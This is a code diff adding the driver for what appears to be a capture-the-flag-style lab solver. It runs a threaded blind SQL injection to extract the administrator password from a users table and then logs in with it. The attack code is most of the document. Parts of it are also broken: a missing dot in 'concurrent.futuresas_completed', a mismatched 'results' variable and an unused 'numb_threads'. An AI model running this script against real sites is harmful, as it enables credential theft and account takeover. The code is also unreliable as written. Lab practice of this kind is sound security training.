@@ -84,8 +84,38 @@ def get_response_string(inner_query, url, no_proxy, num_threads):
         sys.exit()
     if num_threads > response_length:
         numb_threads = response_length
-    
+    tasks = []
+    for i in range(1, response_length + 1):
+        result = {
+            "position": i,
+            "url": url,
+            "no_proxy": no_proxy,
+            "inner_query": inner_query,
+        }
+        tasks.append(result)
+    response_chars = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
+        result = [executor.submit(determine_response_char, task) for task in tasks]
+        for f in concurrent.futuresas_completed(results):
+            response_chars.append(f.result())
+    return format_results(response_chars)
+
+def main(args):
+    num_threads = 8
+    sess = requests.Session()
+    shop = Shop(args.url, args.no_proxy, sess)
+    inner_query = "SELECT password from users where username='administrator'"
+    response_string = get_response_string(
+        inner_query, shop.base_url, shop.no_proxy, num_threads
+    )    
+    log.info(f"response is: {response_string}")
+    shop.login("administrator", response_string)
+    shop.is_solved()
         
+        
+if __name__ == "__main__":
+    args = utils.parse_args(sys.argv)
+    main(args)
         
 #------------------------------------------------------------------------------------------
 #draft
